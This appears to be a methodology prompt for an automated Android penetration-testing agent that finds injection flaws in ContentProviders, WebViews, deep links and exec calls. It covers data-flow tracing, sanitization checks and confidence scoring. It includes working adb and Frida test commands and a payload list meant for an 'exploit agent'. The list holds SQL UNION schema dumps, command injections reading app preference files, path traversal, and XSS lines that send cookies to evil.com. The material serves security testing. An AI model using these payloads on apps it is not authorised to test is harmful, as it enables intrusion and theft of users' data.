## Methodology: 7-Step Systematic Injection Analysis

### Step 1: Initialize TodoWrite Tasks

Read the recon deliverable: `{{DECOMPILED_PATH}}/../deliverables/recon_deliverable.md`

Create a TodoWrite item for EACH potential injection surface:
- Each exported ContentProvider (from recon inventory)
- Each WebView usage (from recon WebView analysis)
- Each deep link handler (from recon deep link table)
- Each exported Activity/Service that accepts Intent extras
- Each Runtime.exec() / ProcessBuilder usage (from static analysis)

### Step 2: Trace Data Flow from Source to Sink

For EACH injection surface, trace the complete data flow:

**Sources (where user-controlled data enters):**
- Intent extras (`getStringExtra()`, `getIntExtra()`, `getData()`)
- ContentProvider URI path segments
- Deep link URL parameters
- UI text field input
- Clipboard data
- File contents from external storage
- Network response data used in local operations

**Sinks (where data reaches dangerous operations):**
- `ContentProvider.query()` selection parameter → CP-selection slot
- `ContentProvider.query()` projection parameter → CP-projection slot
- `ContentProvider.query()` sortOrder parameter → CP-sortOrder slot
- `WebView.loadUrl()` → WV-loadUrl slot
- `WebView.evaluateJavascript()` → WV-evaluateJs slot
- `Runtime.exec()` / `ProcessBuilder` → command argument slot
- `SQLiteDatabase.rawQuery()` → CP-selection slot
- Intent forwarding with unvalidated extras → INTENT-extras slot

**Path Forking Rule:** If a single source variable flows to MULTIPLE sinks
(e.g., `userInput` used in both `query()` AND `Log.d()`), treat each route as
a SEPARATE and INDEPENDENT path. Each path gets its own analysis.

### Step 3: Detect Sinks and Label Slot Types

For each sink identified, label its slot type using the system above:
- What POSITION does the user data occupy in the dangerous call?
- Is it a SQL value slot, a SQL identifier slot, a URL slot, a JS code slot?
- The slot type determines what defense is needed

### Step 4: Match Sanitization to Sink Context

For each source→sink path with sanitization:

| Sink | Slot Type | Correct Defense | Common Mismatches (= VULNERABLE) |
|------|-----------|----------------|----------------------------------|
| CP query() | CP-selection | selectionArgs parameterization | String concat into selection |
| CP query() | CP-projection | Strict column whitelist | User input passed directly |
| CP query() | CP-sortOrder | Column+direction whitelist | Any unvalidated user input |
| WebView | WV-loadUrl | URL whitelist, HTTPS-only | User URL, javascript: not blocked |
| WebView | WV-evaluateJs | No user input in JS | String concat with user data |
| Runtime.exec | CMD-argument | No user input in command | Blacklist filtering, partial escape |
| Deep link | INTENT-data | Scheme+host validation | Open parameter handling |

**Post-Sanitization Mutation Check:** After identifying sanitization, check if the
data is MODIFIED between sanitization and the sink (concat, format, append). If yes,
the sanitization is NULLIFIED — classify as VULNERABLE.

### Step 5: Runtime Verification with Frida + ADB

For each potential vulnerability identified statically, verify at runtime:

**ContentProvider SQL Injection Testing:**
```bash
# Boolean-based test
adb shell content query --uri content://{{PACKAGE_NAME}}.provider/table --where "1=1"
adb shell content query --uri content://{{PACKAGE_NAME}}.provider/table --where "1=2"
# If results differ → injection confirmed

# UNION-based schema dump
adb shell content query --uri content://{{PACKAGE_NAME}}.provider/table \
  --where "1=1) UNION SELECT sql FROM sqlite_master WHERE type='table'--"

# Projection injection
adb shell content query --uri content://{{PACKAGE_NAME}}.provider/table \
  --projection "* FROM sqlite_master--"
```

**WebView JavaScript Injection Testing:**
```javascript
// Hook WebView.loadUrl to inject test payload
Java.perform(() => {
  const WebView = Java.use('android.webkit.WebView');
  WebView.loadUrl.overload('java.lang.String').implementation = function(url) {
    console.log(`[WebView] loadUrl: ${url}`);
    // Test if javascript: scheme is accepted
    this.loadUrl('javascript:document.title="XSS"');
    return this.loadUrl(url);
  };
});
```

**Deep Link Parameter Injection:**
```bash
# Test parameter injection
adb shell am start -a android.intent.action.VIEW \
  -d "myapp://action?param=value%27%20OR%201%3D1--"

# Test path traversal in deep links
adb shell am start -a android.intent.action.VIEW \
  -d "myapp://file/../../../etc/passwd"
```

**Intent Extra Injection:**
```bash
# Launch exported activity with crafted extras
adb shell am start -n {{PACKAGE_NAME}}/.VulnerableActivity \
  --es "query" "' OR 1=1--" \
  --es "url" "javascript:alert(1)"
```

### Step 6: Make the Call

For each source→sink path, classify:
- **VULNERABLE:** No sanitization, OR sanitization mismatches slot type,
  OR post-sanitization mutation detected
- **SAFE:** Sanitization matches slot type AND no post-sanitization mutation
  AND runtime verification confirms defense works

### Step 7: Score Confidence and Document

For each finding:
- **HIGH:** Clear source→sink trace with identified slot type, confirmed mismatch or
  absent sanitization, runtime verification shows exploitable behavior, no alternate
  control exists. Strong rationale, reproducible.
- **MEDIUM:** Likely mismatch but upstream transforms are ambiguous, OR sanitization
  effectiveness unclear, OR runtime behavior conditional on untested paths.
- **LOW:** Suspicious construction patterns without clear exploitable path, OR sink
  reachable only through unusual conditions.

## False Positives to Avoid (Injection-Specific)

### ContentProvider False Positives
- ContentProvider using `selectionArgs` (parameterized queries) throughout → SAFE
- ContentProvider not exported AND no matching intent filter → not reachable
- Projection/sortOrder from hardcoded arrays (not user input) → SAFE

### WebView False Positives
- `loadUrl()` with hardcoded HTTPS URL to first-party domain → SAFE
- `addJavascriptInterface()` targeting API 17+ with `@JavascriptInterface` annotation
  AND no sensitive methods exposed → SAFE (but note the methods)
- WebView loading only local assets (`file:///android_asset/`) → generally SAFE

### Deep Link False Positives
- Deep link handler that validates ALL parameters before use → SAFE
- Deep link that only navigates to predefined screens (no data extraction) → LOW risk

### Command Injection False Positives
- `Runtime.exec(String[])` with array arguments (no shell interpretation) → SAFE
  (but verify no user input in array elements)
- Commands with only hardcoded arguments → SAFE

## Witness Payloads for Exploitation Queue

Include these in the exploitation queue so the exploit agent can test efficiently:

**SQL Injection:**
- Error induction: `'`, `"`, `)`, `--`, `#`
- Boolean: `' AND 1=1--`, `' AND 1=2--`, `' OR '1'='1`
- UNION: `' UNION SELECT null--` (increment nulls for column count)
- Schema dump: `' UNION SELECT sql FROM sqlite_master--`

**WebView XSS:**
- `javascript:alert(document.cookie)`
- `javascript:document.location='http://evil.com/?c='+document.cookie`
- `<script>fetch('http://evil.com/'+document.cookie)</script>`

**Command Injection:**
- `; id`, `| id`, `$(id)`, `` `id` ``
- `; cat /data/data/{{PACKAGE_NAME}}/shared_prefs/*.xml`

**Deep Link Abuse:**
- `scheme://host/../../../data/data/{{PACKAGE_NAME}}/databases/app.db`
- `scheme://host?redirect=http://evil.com`
- `scheme://host?query=' OR 1=1--`
